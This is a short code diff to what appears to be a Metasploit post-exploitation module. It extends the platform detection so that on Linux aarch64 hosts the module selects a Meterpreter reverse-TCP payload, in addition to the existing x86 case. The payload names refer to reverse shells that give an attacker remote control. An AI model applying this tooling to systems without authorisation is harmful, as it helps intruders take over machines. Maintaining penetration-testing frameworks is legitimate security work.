@@ -112,12 +112,17 @@ class MetasploitModule < Msf::Post
     else
       # Find the best fit, be specific with uname to avoid matching hostname or something else
       target_info = cmd_exec('uname -ms')
-      if target_info =~ /linux/i && target_info =~ /86/
+      if target_info =~ /linux/i
         # Handle linux shells that were identified as 'unix'
         platform = 'linux'
-        payload_name = 'linux/x86/meterpreter/reverse_tcp'
         lplat = [Msf::Platform::Linux]
-        larch = [ARCH_X86]
+        if target_info =~ /86/
+          payload_name = 'linux/x86/meterpreter/reverse_tcp'
+          larch = [ARCH_X86]
+        elsif target_info =~ /aarch64/
+          payload_name = 'linux/aarch64/meterpreter/reverse_tcp'
+          larch = [ARCH_AARCH64]
+        end
         vprint_status('Platform: Linux')
       elsif target_info =~ /darwin/i
         platform = 'osx'
